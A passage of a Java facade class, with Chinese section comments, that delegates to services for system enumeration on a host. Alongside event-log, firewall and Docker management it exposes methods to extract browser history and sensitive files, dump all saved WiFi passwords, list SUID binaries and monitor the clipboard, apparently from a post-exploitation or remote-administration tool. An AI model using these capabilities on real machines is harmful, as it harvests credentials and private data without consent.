        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format, maxBytes);
    }

    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format, int maxBytes,
                                             Long cursor, String direction,
                                             Integer minStatus, Integer maxStatus,
                                             String ipPrefix, String pathPrefix) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format, maxBytes,
                cursor, direction, minStatus, maxStatus, ipPrefix, pathPrefix);
    }

    public Map<String, Object> getEventLogStats(String source) throws Exception {
        return eventLogService.stats(source);
    }

    public Map<String, Object> clearEventLog(String source) throws Exception {
        return eventLogService.clear(source);
    }

    public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
                                                 int topN, int maxScan, String keyword,
                                                 Integer minStatus, Integer maxStatus,
                                                 String ipPrefix, String pathPrefix) throws Exception {
        return eventLogService.aggregate(source, format, groupBy, topN, maxScan, keyword,
                minStatus, maxStatus, ipPrefix, pathPrefix);
    }

    public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
                                                 int topN, int maxScan, int maxBytes, String keyword,
                                                 Integer minStatus, Integer maxStatus,
                                                 String ipPrefix, String pathPrefix, boolean slow) throws Exception {
        return eventLogService.aggregate(source, format, groupBy, topN, maxScan, maxBytes, keyword,
                minStatus, maxStatus, ipPrefix, pathPrefix, slow);
    }

    public Map<String, Object> previewEventLog(String source, int lines, boolean fromTail) throws Exception {
        return eventLogService.meta(source, null, lines, fromTail);
    }

    public Map<String, Object> metaEventLog(String source, String format) throws Exception {
        return eventLogService.meta(source, format);
    }

    public Map<String, Object> metaEventLog(String source, String format, int lines, boolean fromTail) throws Exception {
        return eventLogService.meta(source, format, lines, fromTail);
    }

    // ==================== 用户账户管理 ====================

    public Map<String, Object> listUsers() throws Exception {
        return userAccountService.listUsers();
    }

    public Map<String, Object> listGroups() throws Exception {
        return userAccountService.listGroups();
    }

    public Map<String, Object> queryUser(String username) throws Exception {
        return userAccountService.queryUser(username);
    }

    public Map<String, Object> queryGroup(String groupName) throws Exception {
        return userAccountService.queryGroup(groupName);
    }

    public Map<String, Object> whoami() throws Exception {
        return userAccountService.whoami();
    }

    // ==================== 防火墙管理 ====================

    public Map<String, Object> getFirewallStatus() throws Exception {
        return firewallService.status();
    }

    public Map<String, Object> listFirewallRules(String direction, String profile) throws Exception {
        return firewallService.listRules(direction, profile);
    }

    public Map<String, Object> addFirewallRule(String ruleName, String direction, String action,
                                                String protocol, String localPort, String remotePort,
                                                String remoteAddress, String rawRule) throws Exception {
        return firewallService.addRule(ruleName, direction, action, protocol, localPort, remotePort, remoteAddress, rawRule);
    }

    public Map<String, Object> deleteFirewallRule(String ruleName, String ruleIndex, String rawRule) throws Exception {
        return firewallService.deleteRule(ruleName, ruleIndex, rawRule);
    }

    public Map<String, Object> toggleFirewall(boolean enable) throws Exception {
        return firewallService.toggleFirewall(enable);
    }

    // ==================== 网络共享管理 ====================

    public Map<String, Object> listNetworkShares() throws Exception {
        return networkShareService.listShares();
    }

    public Map<String, Object> listNetworkMounts() throws Exception {
        return networkShareService.listMounts();
    }

    public Map<String, Object> queryNetworkShare(String shareName) throws Exception {
        return networkShareService.queryShare(shareName);
    }

    public Map<String, Object> connectNetworkShare(String remotePath, String localDrive,
                                                    String mountPoint, String username,
                                                    String password) throws Exception {
        return networkShareService.connectShare(remotePath, localDrive, mountPoint, username, password);
    }

    public Map<String, Object> disconnectNetworkShare(String target) throws Exception {
        return networkShareService.disconnectShare(target);
    }

    // ==================== 已安装软件枚举 ====================

    public Map<String, Object> listAllSoftware() throws Exception {
        return installedSoftwareService.listAll();
    }

    public Map<String, Object> listSystemSoftware() throws Exception {
        return installedSoftwareService.listSystem();
    }

    public Map<String, Object> listUserSoftware() throws Exception {
        return installedSoftwareService.listUser();
    }

    public Map<String, Object> searchSoftware(String keyword) throws Exception {
        return installedSoftwareService.searchSoftware(keyword);
    }

    // ==================== Docker 容器管理 ====================

    public Map<String, Object> listDockerContainers(boolean all) throws Exception {
        return dockerContainerService.listContainers(all);
    }

    public Map<String, Object> listDockerImages() throws Exception {
        return dockerContainerService.listImages();
    }

    public Map<String, Object> inspectDockerContainer(String containerId) throws Exception {
        return dockerContainerService.inspectContainer(containerId);
    }

    public Map<String, Object> getDockerContainerLogs(String containerId, int tail) throws Exception {
        return dockerContainerService.containerLogs(containerId, tail);
    }

    public Map<String, Object> listDockerNetworks() throws Exception {
        return dockerContainerService.listNetworks();
    }

    public Map<String, Object> getDockerInfo() throws Exception {
        return dockerContainerService.dockerInfo();
    }

    public Map<String, Object> execInDockerContainer(String containerId, String cmd) throws Exception {
        return dockerContainerService.execInContainer(containerId, cmd);
    }

    public Map<String, Object> startDockerContainer(String containerId) throws Exception {
        return dockerContainerService.startContainer(containerId);
    }

    public Map<String, Object> stopDockerContainer(String containerId, int timeout) throws Exception {
        return dockerContainerService.stopContainer(containerId, timeout);
    }

    public Map<String, Object> restartDockerContainer(String containerId, int timeout) throws Exception {
        return dockerContainerService.restartContainer(containerId, timeout);
    }

    public Map<String, Object> pauseDockerContainer(String containerId) throws Exception {
        return dockerContainerService.pauseContainer(containerId);
    }

    public Map<String, Object> unpauseDockerContainer(String containerId) throws Exception {
        return dockerContainerService.unpauseContainer(containerId);
    }

    public Map<String, Object> removeDockerContainer(String containerId, boolean force) throws Exception {
        return dockerContainerService.removeContainer(containerId, force);
    }

    public Map<String, Object> removeDockerImage(String imageId, boolean force) throws Exception {
        return dockerContainerService.removeImage(imageId, force);
    }

    // ==================== SUID/SGID/Capabilities 枚举 ====================

    public Map<String, Object> listSuidFiles() throws Exception {
        return suidCapabilityService.listSuid();
    }

    public Map<String, Object> listSgidFiles() throws Exception {
        return suidCapabilityService.listSgid();
    }

    public Map<String, Object> listFileCapabilities() throws Exception {
        return suidCapabilityService.listCapabilities();
    }

    public Map<String, Object> listAllSuidCaps() throws Exception {
        return suidCapabilityService.listAll();
    }

    // ==================== 浏览器数据提取 ====================

    public Map<String, Object> scanBrowserProfiles() throws Exception {
        return browserDataService.scanProfiles();
    }

    public Map<String, Object> extractBrowserBookmarks() throws Exception {
        return browserDataService.extractBookmarks();
    }

    public Map<String, Object> extractBrowserHistory(int limit) throws Exception {
        return browserDataService.extractHistory(limit);
    }

    public Map<String, Object> listBrowserSensitiveFiles() throws Exception {
        return browserDataService.listSensitiveFiles();
    }

    // ==================== WiFi 配置提取 ====================

    public Map<String, Object> listWifiProfiles() throws Exception {
        return wifiProfileService.listProfiles();
    }

    public Map<String, Object> getWifiProfileDetail(String profileName) throws Exception {
        return wifiProfileService.profileDetail(profileName);
    }

    public Map<String, Object> dumpAllWifiPasswords() throws Exception {
        return wifiProfileService.dumpAllPasswords();
    }

    // ==================== Persistence ====================

    public Map<String, Object> listPersistence() throws Exception {
        return persistenceService.list();
    }

    public Map<String, Object> queryPersistence(String name, String type, String path) throws Exception {
        return persistenceService.query(name, type, path);
    }

    // ==================== NetworkConnection ====================

    public Map<String, Object> listNetworkConnections(String state, String protocol, String port,
                                                       String pid, String process, String remoteIp,
                                                       boolean listeningOnly, int maxEntries) throws Exception {
        return networkConnectionService.list(state, protocol, port, pid, process, remoteIp, listeningOnly, maxEntries);
    }

    public Map<String, Object> listNetworkConnections() throws Exception {
        return networkConnectionService.list();
    }

    public Map<String, Object> networkConnectionSummary() throws Exception {
        return networkConnectionService.summary();
    }

    // ==================== 挂载磁盘枚举 ====================

    public Map<String, Object> listMountDisks() throws Exception {
        return mountDiskService.list();
    }

    // ==================== 剪贴板操作 ====================

    public Map<String, Object> readClipboard() throws Exception {
        return clipboardService.read();
    }

    public Map<String, Object> writeClipboard(String content) throws Exception {
        return clipboardService.write(content);
    }

    public Map<String, Object> monitorClipboard(int duration, int interval) throws Exception {
        return clipboardService.monitor(duration, interval);
    }
}
